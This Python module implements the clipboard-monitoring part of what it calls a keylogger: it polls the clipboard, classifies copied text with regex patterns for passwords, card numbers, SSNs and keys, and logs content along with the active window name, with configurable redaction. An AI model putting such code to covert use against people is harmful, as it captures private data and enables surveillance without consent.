"""Clipboard listener with security and performance optimizations."""

import time
import threading
import logging
import hashlib
import re
from typing import Optional, Dict, Any, Set
import pyperclip

logger = logging.getLogger(__name__)


class ClipboardListener:
    """Enhanced clipboard listener with security and performance features."""
    
    def __init__(self, keylogger_core):
        self.keylogger = keylogger_core
        self.config = keylogger_core.config
        self.is_running = False
        self.monitor_thread: Optional[threading.Thread] = None
        
        # Clipboard state tracking
        self.last_content = ""
        self.last_content_hash = ""
        self.content_history: list = []
        self.change_count = 0
        
        # Performance settings
        self.check_interval = self.config.get('performance.clipboard_check_interval', 1.0)
        self.max_history_size = self.config.get('performance.clipboard_history_size', 100)
        self.max_content_length = self.config.get('privacy.clipboard_max_length', 1000)
        
        # Security settings
        self.log_sensitive_data = self.config.get('privacy.log_clipboard_sensitive', False)
        self.hash_sensitive_data = self.config.get('privacy.hash_clipboard_sensitive', True)
        self.content_length_only = self.config.get('privacy.clipboard_length_only', False)
        
        # Content type detection patterns
        self.sensitive_patterns = {
            'password': [r'password', r'passwd', r'pwd', r'secret', r'token'],
            'email': [r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'],
            'phone': [r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', r'\b\d{10}\b'],
            'credit_card': [r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'],
            'ssn': [r'\b\d{3}-\d{2}-\d{4}\b'],
            'url': [r'https?://[^\s]+'],
            'ip_address': [r'\b(?:\d{1,3}\.){3}\d{1,3}\b'],
            'file_path': [r'[A-Za-z]:\\[^\n]*', r'/[^\s]*'],
            'api_key': [r'[A-Za-z0-9]{32,}', r'sk-[A-Za-z0-9]+', r'pk_[A-Za-z0-9]+'],
            'code': [r'function\s+\w+', r'class\s+\w+', r'def\s+\w+', r'import\s+\w+']
        }
        
        # Statistics
        self.stats = {
            'changes_detected': 0,
            'sensitive_data_filtered': 0,
            'content_types': {},
            'total_characters': 0,
            'average_length': 0,
            'errors': 0
        }
    
    def start(self) -> None:
        """Start the clipboard listener."""
        if self.is_running:
            logger.warning("Clipboard listener is already running")
            return
        
        try:
            self.is_running = True
            
            # Get initial clipboard content
            self._get_initial_content()
            
            # Start monitoring thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_clipboard,
                name='clipboard-monitor',
                daemon=True
            )
            self.monitor_thread.start()
            
            logger.info("Clipboard listener started")
            
        except Exception as e:
            logger.error(f"Failed to start clipboard listener: {e}")
            self.is_running = False
            self.stats['errors'] += 1
            raise
    
    def stop(self) -> None:
        """Stop the clipboard listener."""
        if not self.is_running:
            return
        
        try:
            self.is_running = False
            
            # Wait for monitor thread to finish
            if self.monitor_thread and self.monitor_thread.is_alive():
                self.monitor_thread.join(timeout=2.0)
            
            logger.info("Clipboard listener stopped")
            logger.info(f"Clipboard stats: {self.stats}")
            
        except Exception as e:
            logger.error(f"Error stopping clipboard listener: {e}")
    
    def _get_initial_content(self) -> None:
        """Get initial clipboard content to establish baseline."""
        try:
            content = pyperclip.paste()
            if content:
                self.last_content = content
                self.last_content_hash = self._hash_content(content)
                logger.debug("Initial clipboard content captured")
        except Exception as e:
            logger.error(f"Error getting initial clipboard content: {e}")
            self.stats['errors'] += 1
    
    def _monitor_clipboard(self) -> None:
        """Monitor clipboard for changes."""
        logger.debug("Clipboard monitoring started")
        
        while self.is_running:
            try:
                # Check for clipboard changes
                current_content = pyperclip.paste()
                
                if self._has_content_changed(current_content):
                    self._handle_clipboard_change(current_content)
                
                # Sleep before next check
                time.sleep(self.check_interval)
                
            except Exception as e:
                logger.error(f"Error in clipboard monitoring: {e}")
                self.stats['errors'] += 1
                time.sleep(self.check_interval * 2)  # Longer sleep on error
        
        logger.debug("Clipboard monitoring stopped")
    
    def _has_content_changed(self, current_content: str) -> bool:
        """Check if clipboard content has changed."""
        if current_content is None:
            current_content = ""
        
        # Quick check using hash for performance
        current_hash = self._hash_content(current_content)
        
        if current_hash != self.last_content_hash:
            # Double-check with actual content comparison
            if current_content != self.last_content:
                return True
        
        return False
    
    def _handle_clipboard_change(self, content: str) -> None:
        """Handle clipboard content change."""
        try:
            self.change_count += 1
            self.stats['changes_detected'] += 1
            
            # Update tracking variables
            self.last_content = content
            self.last_content_hash = self._hash_content(content)
            
            # Add to history
            self._add_to_history(content)
            
            # Analyze and log content
            self._analyze_and_log_content(content)
            
        except Exception as e:
            logger.error(f"Error handling clipboard change: {e}")
            self.stats['errors'] += 1
    
    def _add_to_history(self, content: str) -> None:
        """Add content to history with size management."""
        history_entry = {
            'content_hash': self._hash_content(content),
            'length': len(content),
            'timestamp': time.time(),
            'content_type': self._detect_content_type(content)
        }
        
        # Store limited content for analysis (not full content for privacy)
        if len(content) <= 100:  # Only store short content
            history_entry['preview'] = content[:50] + ('...' if len(content) > 50 else '')
        
        self.content_history.append(history_entry)
        
        # Limit history size
        if len(self.content_history) > self.max_history_size:
            self.content_history = self.content_history[-self.max_history_size:]
    
    def _analyze_and_log_content(self, content: str) -> None:
        """Analyze content and log appropriately."""
        try:
            # Basic content analysis
            content_length = len(content)
            content_type = self._detect_content_type(content)
            is_sensitive = self._is_sensitive_content(content)
            
            # Update statistics
            self.stats['total_characters'] += content_length
            self.stats['average_length'] = self.stats['total_characters'] / self.stats['changes_detected']
            
            if content_type not in self.stats['content_types']:
                self.stats['content_types'][content_type] = 0
            self.stats['content_types'][content_type] += 1
            
            # Determine what to log based on settings and content
            log_details = self._prepare_log_details(content, content_type, is_sensitive)
            
            if log_details:
                window_name = self.keylogger.session_stats.get('active_window', 'Unknown')
                
                # Skip if application is excluded
                if self.config.is_application_excluded(window_name):
                    return
                
                self.keylogger.log_event(
                    "Clipboard Change",
                    log_details,
                    window_name,
                    metadata={
                        'content_type': content_type,
                        'length': content_length,
                        'is_sensitive': is_sensitive,
                        'change_number': self.change_count,
                        'timestamp': time.time()
                    }
                )
            
        except Exception as e:
            logger.error(f"Error analyzing clipboard content: {e}")
            self.stats['errors'] += 1
    
    def _prepare_log_details(self, content: str, content_type: str, is_sensitive: bool) -> Optional[str]:
        """Prepare log details based on privacy settings."""
        try:
            # Handle sensitive content
            if is_sensitive:
                self.stats['sensitive_data_filtered'] += 1
                
                if not self.log_sensitive_data:
                    return f"[SENSITIVE_{content_type.upper()}_DETECTED] Length: {len(content)}"
                elif self.hash_sensitive_data:
                    content_hash = self._hash_content(content)[:16]
                    return f"[SENSITIVE_{content_type.upper()}_HASH:{content_hash}] Length: {len(content)}"
            
            # Handle based on content length only setting
            if self.content_length_only:
                return f"Content copied ({content_type}): {len(content)} characters"
            
            # Truncate long content
            if len(content) > self.max_content_length:
                truncated_content = content[:self.max_content_length] + "...[truncated]"
                return f"Content copied ({content_type}): {truncated_content}"
            
            # Log full content for non-sensitive, short content
            if len(content) <= 200:  # Short content threshold
                return f"Content copied ({content_type}): {content}"
            else:
                # For longer content, provide summary
                preview = content[:100] + "...[preview]"
                return f"Content copied ({content_type}, {len(content)} chars): {preview}"
            
        except Exception as e:
            logger.error(f"Error preparing log details: {e}")
            return f"Clipboard content changed ({content_type}): {len(content)} characters"
    
    def _detect_content_type(self, content: str) -> str:
        """Detect the type of clipboard content."""
        try:
            # Normalize content
            if content is None:
                content = ''
            elif not isinstance(content, str):
                try:
                    content = str(content)
                except Exception:
                    content = ''
            
            if not content.strip():
                return 'empty'
            
            content_lower = content.lower()
            
            # Check each pattern type
            for content_type, patterns in self.sensitive_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return content_type
            
            # Additional type detection
            if content.isdigit():
                return 'numeric'
            elif '\n' in content and len(content.split('\n')) > 3:
                return 'multiline_text'
            elif len(content.split()) == 1:
                return 'single_word'
            elif content.startswith(('http://', 'https://', 'ftp://')):
                return 'url'
            elif content.startswith(('/', 'C:\\', 'D:\\')):
                return 'file_path'
            else:
                return 'text'
            
        except Exception as e:
            logger.error(f"Error detecting content type: {e}")
            return 'unknown'
    
    def _is_sensitive_content(self, content: str) -> bool:
        """Check if content contains sensitive information."""
        try:
            # Normalize content
            if content is None:
                content = ''
            elif not isinstance(content, str):
                try:
                    content = str(content)
                except Exception:
                    content = ''
            
            content_lower = content.lower()
            
            # Check for sensitive patterns
            sensitive_types = ['password', 'email', 'phone', 'credit_card', 'ssn', 'api_key']
            
            for content_type in sensitive_types:
                if content_type in self.sensitive_patterns:
                    for pattern in self.sensitive_patterns[content_type]:
                        if re.search(pattern, content, re.IGNORECASE):
                            return True
            
            # Check for sensitive keywords from config
            sensitive_keywords = self.config.get('privacy.sensitive_keywords', [])
            for keyword in sensitive_keywords:
                if keyword.lower() in content_lower:
                    return True
            
            # Check for potential private keys or certificates
            if any(marker in content for marker in [
                '-----BEGIN', '-----END', 'PRIVATE KEY', 'CERTIFICATE',
                'ssh-rsa', 'ssh-ed25519'
            ]):
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error checking sensitive content: {e}")
            return False
    
    def _hash_content(self, content: str) -> str:
        """Generate hash of content for comparison."""
        try:
            return hashlib.sha256(content.encode('utf-8')).hexdigest()
        except Exception as e:
            logger.error(f"Error hashing content: {e}")
            return ""
    
    def get_stats(self) -> Dict[str, Any]:
        """Get listener statistics."""
        return {
            **self.stats,
            'is_running': self.is_running,
            'history_size': len(self.content_history),
            'change_count': self.change_count,
            'last_content_length': len(self.last_content)
        }
    
    def get_content_analysis(self) -> Dict[str, Any]:
        """Get detailed content analysis."""
        if not self.content_history:
            return {}
        
        # Analyze content patterns
        type_distribution = {}
        length_distribution = {'short': 0, 'medium': 0, 'long': 0}
        hourly_activity = {}
        
        for entry in self.content_history:
            # Type distribution
            content_type = entry.get('content_type', 'unknown')
            type_distribution[content_type] = type_distribution.get(content_type, 0) + 1
            
            # Length distribution
            length = entry.get('length', 0)
            if length < 50:
                length_distribution['short'] += 1
            elif length < 500:
                length_distribution['medium'] += 1
            else:
                length_distribution['long'] += 1
            
            # Hourly activity
            timestamp = entry.get('timestamp', 0)
            hour = time.strftime('%H', time.localtime(timestamp))
            hourly_activity[hour] = hourly_activity.get(hour, 0) + 1
        
        return {
            'type_distribution': type_distribution,
            'length_distribution': length_distribution,
            'hourly_activity': hourly_activity,
            'total_entries': len(self.content_history),
            'average_length': sum(e.get('length', 0) for e in self.content_history) / len(self.content_history)
        }
    
    def clear_history(self) -> None:
        """Clear clipboard history."""
        self.content_history.clear()
        logger.info("Clipboard history cleared")
    
    def export_history(self, include_sensitive: bool = False) -> list:
        """Export clipboard history for analysis."""
        exported_history = []
        
        for entry in self.content_history:
            exported_entry = {
                'timestamp': entry['timestamp'],
                'content_type': entry['content_type'],
                'length': entry['length'],
                'content_hash': entry['content_hash']
            }
            
            # Include preview if available and not sensitive
            if 'preview' in entry and (include_sensitive or entry['content_type'] not in ['password', 'api_key']):
                exported_entry['preview'] = entry['preview']
            
            exported_history.append(exported_entry)
        
        return exported_history